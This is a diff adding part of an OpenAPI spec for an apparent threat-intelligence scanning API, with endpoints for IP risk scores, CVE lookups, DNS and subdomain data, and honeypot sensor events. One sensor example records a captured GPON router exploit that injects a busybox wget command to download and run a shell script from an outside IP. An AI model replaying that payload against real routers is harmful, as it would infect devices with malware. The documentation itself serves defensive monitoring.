+                          cpe:
+                            - 'cpe:/a:postfix:postfix'
+                          cve_list: no_version_provided
+                          score: 0
+                        score: 0
+                      - port: 3306
+                        cve:
+                          - cpe: 'cpe:/a:mysql:mysql:5.5.47-mariadb'
+                            cve_list:
+                              - cve: CVE-2005-1274
+                                cvss: 10
+                              - cve: CVE-2005-0081
+                                cvss: 5
+                              - cve: CVE-2005-0082
+                                cvss: 5
+                              - cve: CVE-2005-0684
+                                cvss: 10
+                              - cve: CVE-2011-2262
+                                cvss: 5
+                              - cve: CVE-2012-0112
+                                cvss: 3.5
+                              - cve: CVE-2012-0113
+                                cvss: 5.5
+                              - cve: CVE-2012-0115
+                                cvss: 4
+                              - cve: CVE-2012-0116
+                                cvss: 4.9
+                              - cve: CVE-2012-0117
+                                cvss: 3.5
+                              - cve: CVE-2012-0118
+                                cvss: 4.9
+                              - cve: CVE-2012-0119
+                                cvss: 4
+                              - cve: CVE-2012-0120
+                                cvss: 4
+                              - cve: CVE-2015-3152
+                                cvss: 4.3
+                              - cve: CVE-2016-0610
+                                cvss: 3.5
+                              - cve: CVE-2016-6664
+                                cvss: 6.9
+                              - cve: CVE-2004-0931
+                                cvss: 5
+                              - cve: CVE-2017-3302
+                                cvss: 5
+                              - cve: CVE-2016-7412
+                                cvss: 6.8
+                              - cve: CVE-2016-6662
+                                cvss: 10
+                              - cve: CVE-2009-4833
+                                cvss: 5.8
+                              - cve: CVE-2012-0485
+                                cvss: 4
+                              - cve: CVE-2012-0486
+                                cvss: 5
+                              - cve: CVE-2012-0487
+                                cvss: 4
+                              - cve: CVE-2012-0488
+                                cvss: 4
+                              - cve: CVE-2012-0489
+                                cvss: 4
+                              - cve: CVE-2012-0491
+                                cvss: 4
+                              - cve: CVE-2012-0492
+                                cvss: 2.1
+                              - cve: CVE-2012-0493
+                                cvss: 2.1
+                              - cve: CVE-2012-0494
+                                cvss: 1.7
+                              - cve: CVE-2012-0495
+                                cvss: 4
+                              - cve: CVE-2012-0496
+                                cvss: 4.3
+                              - cve: CVE-2016-6663
+                                cvss: 4.4
+                              - cve: CVE-2005-1636
+                                cvss: 4.6
+                            score: 164.8
+                        score: 164.8
+                    score: 454.40000000000003
+                  ssh:
+                    result:
+                      - port: 22
+                        algorithms:
+                          mac:
+                            - mac: hmac-sha1-96
+                              score: 2
+                            - mac: hmac-sha1
+                              score: 2
+                            - mac: hmac-md5
+                              score: 2
+                          key_exchange:
+                            - kex: diffie-hellman-group1-sha1
+                              score: 2
+                          encryption:
+                            - enc: aes128-cbc
+                              score: 0
+                            - enc: 3des-cbc
+                              score: 2
+                            - enc: aes256-cbc
+                              score: 0
+                        keys:
+                          - fingerprint: 'b7:d7:10:fd:b8:fb:91:2b:5e:a8:01:b2:03:e3:10:4f'
+                            key_length:
+                              length: 1024
+                              score: 2
+                            debian_key:
+                              found: false
+                              score: 0
+                        score: 12
+                    score: 12
+                  rms:
+                    result:
+                      - port: 3389
+                        rms: rdp
+                        score: 8
+                      - port: 5901
+                        rms: vnc
+                        score: 10
+                      - port: 23
+                        rms: telnet
+                        score: 8
+                    score: 26
+                  ssl:
+                    result:
+                      - port: 443
+                        heartbleed:
+                          heartbleed: true
+                          score: 10
+                        ccs:
+                          ccs: true
+                          score: 6
+                        crime:
+                          crime: true
+                          score: 6
+                        renegotiation:
+                          renegotiation: true
+                          score: 6
+                        ocsp:
+                          ocsp: true
+                          score: 3
+                        no_certificates:
+                          no_certificates: false
+                          score: 0
+                        leaf_certificate:
+                          sha1_fingerprint: c0e750b485ed9250f93f684bb1a87d37bec843b8
+                          issuer: Huawei
+                          subject: Huawei
+                          validity:
+                            date: '2016-07-14 09:48:15'
+                            status: expired
+                            score: 4
+                          signature:
+                            signature: sha1WithRSAEncryption
+                            score: 5
+                          self_signed:
+                            self_signed: single-certificate
+                            score: 5
+                        other_certificates: []
+                        ciphers:
+                          - drown: true
+                            score: 6
+                          - poodle: true
+                            score: 6
+                          - logjam: false
+                            score: 0
+                        score: 52
+                    score: 52
+                  wec:
+                    result:
+                      - port: 25
+                        service: smtp
+                        score: 6
+                    score: 6
+                  ftp:
+                    result:
+                      - port: 21
+                        service: ftp
+                        score: 6
+                    score: 6
+                  http:
+                    result:
+                      - port: 4991
+                        service: http
+                        score: 6
+                      - port: 8080
+                        service: http
+                        score: 6
+                    score: 12
+                  storage:
+                    result:
+                      - port: 6666
+                        product: postgres
+                        score: 4
+                      - port: 6666
+                        product: mysql
+                        score: 4
+                      - port: 1883
+                        product: mqtt
+                        connected: true
+                        score: 10
+                      - port: 27017
+                        product: mongodb
+                        connected: true
+                        score: 10
+                      - port: 6379
+                        product: redis
+                        connected: true
+                        score: 10
+                      - port: 11211
+                        product: memcached
+                        connected: true
+                        score: 10
+                      - port: 9200
+                        product: elasticsearch
+                        connected: true
+                        score: 10
+                      - port: 3306
+                        product: mysql
+                        score: 4
+                    score: 62
+                  web:
+                    result:
+                      - port: 80
+                        headers: true
+                        score: 3
+                    score: 3
+                  torrents:
+                    result:
+                      - torrents: false
+                        score: 0
+                    score: 0
+                ip_address: xxx.xxx.xxx.xxx
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/cve/ip/{target}:
+    get:
+      tags:
+        - Risk Score
+      summary: ""
+      description: "Get list of CVEs that migh affect a specific IP."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] target IP address"
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Return Rish Score result"
+          content:
+            application/json:
+              example:
+                query: xxx.xxx.xxx.xxx
+                events:
+                  ip: xxx.xxx.xxx.xxx
+                  ports:
+                    - 11
+                    - 15
+                    - 21
+                    - 25
+                    - 79
+                    - 80
+                    - 111
+                    - 119
+                    - 143
+                    - 3389
+                    - 6000
+                    - 8080
+                  results:
+                    - port: 111
+                      cpe: []
+                      ts: 1550723598503
+                      cves: []
+                    - port: 11
+                      cpe: []
+                      ts: 1550713541527
+                      cves: []
+                    - port: 6000
+                      cpe: []
+                      ts: 1549215405492
+                      cves: []
+                    - port: 25
+                      cpe: []
+                      ts: 1551649814882
+                      cves: []
+                    - port: 79
+                      cpe: []
+                      ts: 1550042997176
+                      cves: []
+                    - port: 8080
+                      cpe:
+                        - 'cpe:/a:apache:http_server:2.4.7'
+                      ts: 1551779143688
+                      cves:
+                        - cve: CVE-2018-17199
+                          cvss: 5
+                        - cve: CVE-2018-1312
+                          cvss: 6.8
+                        - cve: CVE-2018-1283
+                          cvss: 3.5
+                        - cve: CVE-2017-9798
+                          cvss: 5
+                        - cve: CVE-2017-9788
+                          cvss: 6.4
+                        - cve: CVE-2017-7679
+                          cvss: 7.5
+                        - cve: CVE-2017-15715
+                          cvss: 6.8
+                        - cve: CVE-2017-15710
+                          cvss: 5
+                        - cve: CVE-2016-8743
+                          cvss: 5
+                        - cve: CVE-2016-8612
+                          cvss: 3.3
+                        - cve: CVE-2016-4975
+                          cvss: 4.3
+                        - cve: CVE-2016-2161
+                          cvss: 5
+                        - cve: CVE-2016-0736
+                          cvss: 5
+                        - cve: CVE-2015-3185
+                          cvss: 4.3
+                        - cve: CVE-2015-3184
+                          cvss: 5
+                        - cve: CVE-2014-8109
+                          cvss: 4.3
+                        - cve: CVE-2014-3523
+                          cvss: 5
+                        - cve: CVE-2014-0231
+                          cvss: 5
+                        - cve: CVE-2014-0226
+                          cvss: 6.8
+                        - cve: CVE-2014-0118
+                          cvss: 4.3
+                        - cve: CVE-2014-0117
+                          cvss: 4.3
+                        - cve: CVE-2014-0098
+                          cvss: 5
+                        - cve: CVE-2013-6438
+                          cvss: 5
+                    - port: 3389
+                      cpe: []
+                      ts: 1551348878536
+                      cves: []
+                    - port: 15
+                      cpe: []
+                      ts: 1549108048510
+                      cves: []
+                    - port: 143
+                      cpe: []
+                      ts: 1549566728724
+                      cves: []
+                    - port: 80
+                      cpe:
+                        - 'cpe:/a:igor_sysoev:nginx:1.4.6'
+                      ts: 1550250446832
+                      cves:
+                        - cve: CVE-2019-7401
+                          cvss: 7.5
+                        - cve: CVE-2016-4450
+                          cvss: 5
+                        - cve: CVE-2016-0747
+                          cvss: 5
+                        - cve: CVE-2016-0746
+                          cvss: 7.5
+                        - cve: CVE-2016-0742
+                          cvss: 5
+                        - cve: CVE-2014-3616
+                          cvss: 4.3
+                        - cve: CVE-2014-0133
+                          cvss: 5.1
+                    - port: 21
+                      cpe: []
+                      ts: 1550642140211
+                      cves: []
+                    - port: 119
+                      cpe: []
+                      ts: 1550377835750
+                      cves: []
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/domains/subdomain/{target}:
+    get:
+      tags:
+        - Domain
+      summary: ""
+      description: "Return list of subdomains known from the target domains."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] Domain you want to get list of known subdomains."
+          schema:
+            type: string
+          required: true
+        - in: query
+          name: page
+          description: "[int] Number of the page"
+          schema:
+            type: integer
+            default: 1
+        - in: query
+          name: pagesize
+          description: "[int] Number of results per page"
+          schema:
+            type: integer
+            default: 100
+            
+      responses:
+        '200':
+          description: "Return Domains results"
+          content:
+            application/json:
+              example:
+                query: 'root:example.com'
+                page: 1
+                pagesize: 100
+                total: 6308
+                events:
+                  - m.example.com
+                  - startup.antichat.example.com
+                  - anandop1.example.com
+                  - vladimirbezz3.example.com
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/domains/dns/{target}:
+    get:
+      tags:
+        - Domain
+      summary: ""
+      description: "Return list of known DNS results for the target domain. Possible types of records currently available:\n\n -A, AAAA, NS, MX"
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] Domain you want to get DNS related data."
+          schema:
+            type: string
+          required: true
+        - in: query
+          name: page
+          description: "[int] Number of the page"
+          schema:
+            type: integer
+            default: 1
+        - in: query
+          name: pagesize
+          description: "[int] Number of results per page"
+          schema:
+            type: integer
+            default: 100
+      
+      responses:
+        '200':
+          description: "Return Domains results"
+          content:
+            application/json:
+              example:
+                query: 'root:example.com'
+                page: 1
+                pagesize: 100
+                total: 6308
+                events:
+                  - A:
+                      - 92.63.97.42
+                    updated_at: '2018-09-22T04:53:21.082802'
+                    domain: startup.antichat.example.com
+                    root: example.com
+                  - A:
+                      - 93.184.216.34
+                    MX:
+                      - example.com
+                    NS:
+                      - ns1.example.com
+                      - ns2.example.com
+                    updated_at: '2018-12-10T13:20:16.854174'
+                    domain: example.com
+                    root: example.com
+                  - A:
+                      - 91.235.136.112
+                    updated_at: '2018-09-22T04:14:29.031596'
+                    domain: vladimirbezz3.example.com
+                    root: example.com
+                  - A:
+                      - 93.179.68.6
+                    updated_at: '2018-09-22T03:51:36.852124'
+                    domain: i.seeva.example.com
+                    root: example.com
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/domains/ip/{target}:
+    get:
+      tags:
+        - Domain
+      summary: ""
+      description: "Return records that have the specified IP address in their A or AAAA records."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] target IP address or CIDR up to /24, supports IPV4 or IPV6."
+          schema:
+            type: string
+          required: true
+        - in: query
+          name: page
+          description: "[int] Number of the page"
+          schema:
+            type: integer
+            default: 1
+        - in: query
+          name: pagesize
+          description: "[int] Number of results per page"
+          schema:
+            type: integer
+            default: 100
+      
+      responses:
+        '200':
+          description: "Return Domains results"
+          content:
+            application/json:
+              example:
+                query: 'A:"8.8.8.8"'
+                page: 1
+                pagesize: 100
+                total: 726
+                events:
+                  - A:
+                      - 8.8.8.8
+                    updated_at: '2018-06-08T20:51:30.676063'
+                    NS:
+                      - ns1058.ui-dns.org
+                      - ns1062.ui-dns.com
+                      - ns1068.ui-dns.biz
+                      - ns1096.ui-dns.de
+                    domain: aeroway.co.uk
+                    root: aeroway.co.uk
+                    MX:
+                      - mx00.1and1.co.uk
+                      - mx01.1and1.co.uk
+                  - A:
+                      - 8.8.8.8
+                    updated_at: '2018-06-08T20:53:30.348620'
+                    NS:
+                      - f1g1ns1.dnspod.net
+                      - f1g1ns2.dnspod.net
+                    domain: 84168800.com
+                    root: 84168800.com
+                  - A:
+                      - 8.8.8.8
+                    updated_at: '2018-06-08T20:53:32.450310'
+                    NS:
+                      - f1g1ns1.dnspod.net
+                      - f1g1ns2.dnspod.net
+                    domain: 84169911.com
+                    root: 84169911.com
+                  - A:
+                      - 8.8.8.8
+                    updated_at: '2018-06-08T20:53:32.508761'
+                    NS:
+                      - f1g1ns1.dnspod.net
+                      - f1g1ns2.dnspod.net
+                    domain: 84163311.com
+                    root: 84163311.com
+                  - A:
+                      - 8.8.8.8
+                    updated_at: '2018-06-08T20:53:32.540496'
+                    NS:
+                      - f1g1ns1.dnspod.net
+                      - f1g1ns2.dnspod.net
+                    domain: 00888416.com
+                    root: 00888416.com
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/domains/search:
+    get:
+      tags:
+        - Domain
+      summary: ""
+      description: "List of Domains/DNS data based on a Query. Can be used with specific parameters and/or full-text search. Possible types of records currently available:\n\n -A, AAAA, NS, MX, CNAME, TXT"
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: query
+          name: query
+          description: "[String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. \n\n example: A:127.0.0.1"
+          schema:
+            type: string
+          required: true
+        - in: query
+          name: page
+          description: "[Int] Optional. Default 1"
+          schema:
+            type: integer
+            default: 1
+        - in: query
+          name: pagesize
+          description: "[Int] Optional. Default 100"
+          schema:
+            type: integer
+            default: 100
+      
+      responses:
+        '200':
+          description: "Return Domains results"
+          content:
+            application/json:
+              example:
+                query: 'A:127.0.0.1'
+                page: 1
+                pagesize: 100
+                total: 176685
+                events:
+                  - A:
+                      - 127.0.0.1
+                    updated_at: '2018-06-08T20:32:57.002881'
+                    NS:
+                      - ns3jkl.name.com
+                      - ns4qxz.name.com
+                      - ns2knz.name.com
+                      - ns1ksz.name.com
+                    domain: heathynurseway.co.uk
+                    root: heathynurseway.co.uk
+                    MX:
+                      - mail.emailgoodbye.me
+                  - A:
+                      - 127.0.0.1
+                    updated_at: '2018-06-08T20:29:19.612334'
+                    NS:
+                      - ns1.antagus.de
+                      - ns2.antagus.de
+                    domain: vit.press
+                    root: vit.press
+                    MX:
+                      - mail.vit.press
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/sensors/ip/{target}:
+    get:
+      tags:
+        - Sensor
+      summary: ""
+      description: "Details about an Scanner. List of recent events form the specified host, including details of scanned ports, payloads and tags."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] target IP address or CIDR up to /24"
+          schema:
+            type: string
+          required: true
+        - in: query
+          name: page
+          description: "[int] Number of the page"
+          schema:
+            type: integer
+            default: 1
+        - in: query
+          name: pagesize
+          description: "[int] Number of results per page"
+          schema:
+            type: integer
+            default: 100
+      
+      responses:
+        '200':
+          description: "Return Sensor data"
+          content:
+            application/json:
+              example:
+                query: xxx.xxx.xxx.xxx
+                total: 1
+                targets_found: 1
+                events:
+                  - port: 443
+                    results:
+                      - target:
+                          port: 443
+                          protocol: tcp
+                        origin:
+                          ts: 1549500839739
+                          type: sinkhole
+                          ip: xxx.xxx.xxx.xxx
+                          rdns: xxx.xxx.xxx.example.com
+                        data:
+                          payload: 'POST /GponForm/diag_Form?style/ HTTP/1.1\r\nUser-Agent: Hello, World\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://185.244.25.98/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0'
+                          extra:
+                            http:
+                              method: POST
+                              path: /GponForm/diag_Form?style/
+                              version: '1.1'
+                              headers:
+                                user-agent: 'Hello, World'
+                                accept: '*/*'
+                                accept-encoding: 'gzip, deflate'
+                                content-type: application/x-www-form-urlencoded
+                          tags:
+                            - HTTP_SCANNER
+                        '@timestamp': '2019-02-07T00:54:00.422Z'
+                
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/sensors/search:
+    get:
+      tags:
+        - Sensor
+      summary: ""
+      description: "Events based on a Query. List of recent events for the given query, including details of scanned ports, payloads and tags. Can be used with specific parameters and/or full-text search."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: query
+          name: query
+          description: "[String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](https://docs.binaryedge.io/sensors-search/) for details on what parameters can be used."
+          required: true
+          schema:
+            type: string
+        - in: query
+          name: page
+          description: "[int] Number of the page"
+          schema:
+            type: integer
+            default: 1
+        - in: query
+          name: pagesize
+          description: "[int] Number of results per page"
+          schema:
+            type: integer
+            default: 100
+      
+      responses:
+        '200':
+          description: "Return Sensor results"
+          content:
+            application/json:
+              example:
+                query: 'tags:ssh_scanner'
+                page: 1
+                pagesize: 20
+                total: 1117979
+                events:
+                  - data:
+                      payload: SSH-2.0-PUTTY\r\n
+                      extra:
+                        ssh:
+                          description: SSH-2.0-PUTTY
+                      tags:
+                        - SSH_SCANNER
+                    target:
+                      port: 22
+                      protocol: tcp
+                    origin:
+                      ip: 218.92.1.153
+                      type: sinkhole
+                      ts: 1549625590653
+                      asn: 4134
+                  - target:
+                      port: 22
+                      protocol: tcp
+                    data:
+                      payload: '\x00\x00\x02\x84\x07\x14t\x85\x97.Sf\x88\xa3\x1a\x7f\xf7:ZzG\\\x00\x00\x00Ydiffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1\x00\x00\x00\x0fssh-rsa,ssh-dss\x00\x00\x00\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\x00\x00\x00\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\x00\x00\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\x00\x00\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\x00\x00\x00\x04none\x00\x00\x00\x04none\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00=@\x8d71\xc9&'
+                      extra:
+                        ssh:
+                          hassh: 92674389fa1e47a27ddd8d9b63ecd42b
+                          hassh_algorithms: 'diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none'
+                      tags:
+                        - SSH_SCANNER
+                    origin:
+                      ip: 58.242.83.31
+                      type: sinkhole
+                      ts: 1549625585310
+                      asn: 4837
+                  - ...: null
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/sensors/search/stats:
+    get:
+      tags:
+        - Sensor
+      summary: ""
+      description: "Statistics of recent events for the given query. Can be used with specific parameters and/or full-text search."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: query
+          name: query
+          schema:
+            type: string
+          description: "[String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](https://docs.binaryedge.io/search/) for details on what parameters can be used."
+          required: true
+        - in: query
+          name: type
+          schema:
+            type: string
+          description: "[String] Type of statistic we want to obtain. Possible types include:\n\n - ports, tags, countries, asn, ips, payloads, http_path, rdns."
+          required: true
+        - in: query
+          name: days
+          description: "Number of days to get the stats for. For example days=1 for the last day of data."
+          schema:
+            type: integer
+            default: 60
+        - in: query
+          name: order
+          description: "[desc,asc] Whether to sort descendently or ascendently to get the top."
+          schema:
+            type: string
+            #enum: ["desc", "asc"]
+      
+      responses:
+        '200':
+          description: "Return Sensor stats results."
+          content:
+            application/json:
+              example:
+                - key: 22/tcp
+                  doc_count: 1102752
+                - key: 2222/tcp
+                  doc_count: 8149
+                - key: 222/tcp
+                  doc_count: 1970
+                - key: 4000/tcp
+                  doc_count: 1962
+                - key: 23/tcp
+                  doc_count: 1552
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/sensors/tag/{query}:
+    get:
+      tags:
+        - Sensor
+      summary: ""
+      description: "Get a list of IPs that have been associated with a specific TAG."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: query
+          schema:
+            type: string
+          description: "[String] Tag you want to get the list of IPs related to. **example**: MALICIOUS"
+          required: true
+        - in: query
+          name: days
+          description: "[Integer] Query Param: Number of days to get the stats for. For example days=1 for the last day of data."
+          schema:
+            type: integer
+            minimum: 1
+            maximum: 60
+            default: 1
+      
+      responses:
+        '200':
+          description: "Return stats results."
+          content:
+            application/json:
+              example:
+                - 1.34.221.87
+                - 1.160.38.189
+                - 1.160.39.129
+                - 1.160.91.241
+                - 1.160.130.56
+                - 1.160.160.98
+                - 1.161.118.167
+                 
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+              
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'           
+
+components:
+  securitySchemes:
+    Token:  
+      type: apiKey
+      in: header
+      name: X-Token  
+
+  responses:
+    HTTPStatusMessage400:
+      description: "Bad Parameter"
+      content:
+        application/json:
+          schema:
+            type: object
+            properties:
+              status:
+                type: integer
+              title:
+                type: string
+              message:
+                type: string
+            example:
+              status: "400"
+              title: "Bad Request"
+              description: "Bad Parameter. Please review your query and try again." 
+              
+    HTTPStatusMessage401:
+      description: "Could not validate token"
+      content:
+        application/json:
+          schema:
+            type: object
+            properties:
+              status:
+                type: integer
+              title:
+                type: string
+              message:
+                type: string
+          example:
+            status: "401"
+            title: "Unauthorized"
+            description: "Could not validate token. Please review your token and try again."
+  
+    HTTPStatusMessage403:
+      description: "Forbidden"
+      content:
+        application/json:
+          schema:
+            type: object
+            properties:
+              status:
+                type: integer
+              title:
+                type: string
+              message:
+                type: string
+          example:
+            status: "403"
+            title: "Forbidden"
+            message: "Your plan doesn't allow you to access this resource."
+          
+    HTTPStatusMessage404:
+      description: 'Page not found'
+      content:
+        application/json:
+          schema:
+            type: object
+            properties:
+              status:
+                type: integer
+              title:
+                type: string
+              message:
+                type: string
+          example:
+            status: "404"
+            title: "Not Found"
+            message: "Page not found."
